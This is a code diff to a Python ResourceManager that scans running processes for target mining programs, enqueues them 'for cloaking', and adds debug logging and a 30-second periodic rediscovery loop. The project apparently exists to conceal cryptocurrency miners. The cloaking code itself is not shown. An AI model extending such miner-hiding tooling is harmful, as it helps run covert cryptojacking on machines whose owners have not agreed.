@@ -770,10 +770,17 @@ class ResourceManager(IResourceManager):
         discovered_count = 0
         
         try:
+            self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Starting psutil.process_iter scan...")
+            process_count = 0
+            target_found = 0
+            
             for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                process_count += 1
                 try:
                     proc_name = proc.info['name']
                     if proc_name in target_processes:
+                        target_found += 1
+                        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Found target process: {proc_name}")
                         pid = proc.info['pid']
                         is_gpu = target_processes[proc_name]
                         
@@ -794,8 +801,10 @@ class ResourceManager(IResourceManager):
                                 self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
                                 self.enqueue_cloaking(mining_process)
                                 discovered_count += 1
+                                self.logger.info(f"🔍 [COUNTER DEBUG] New process added - discovered_count now: {discovered_count}")
                             else:
-                                self.logger.debug(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping")
+                                self.logger.info(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping (not counted)")
+                                self.logger.info(f"🔍 [COUNTER DEBUG] Process already exists - discovered_count remains: {discovered_count}")
                                 
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     # Skip processes that can't be accessed
@@ -806,6 +815,10 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"❌ [PROCESS DISCOVERY] Discovery failed: {e}")
             
+        # Final detailed report
+        current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
+        self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Scan completed - total processes: {process_count}, targets found: {target_found}")
+        self.logger.info(f"🔍 [COUNTER DEBUG] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
         self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} mining processes")
 
     def start(self):
@@ -873,7 +886,18 @@ class ResourceManager(IResourceManager):
             
             # Ultra-fast main loop với minimal monitoring
             self.logger.info("🔄 Entering minimal main monitoring loop...")
+            last_discovery_time = time.time()
+            discovery_interval = 30  # Run Process Discovery every 30 seconds
+            
             while not self._stop_flag:
+                current_time = time.time()
+                
+                # Periodic Process Discovery để phát hiện mining processes mới
+                if current_time - last_discovery_time >= discovery_interval:
+                    self.logger.info("🔍 [PERIODIC DISCOVERY] Running periodic process discovery...")
+                    self._discover_and_register_existing_processes()
+                    last_discovery_time = current_time
+                
                 time.sleep(1.0)  # Basic monitoring interval
 
             self.logger.info("ResourceManager main loop completed.")
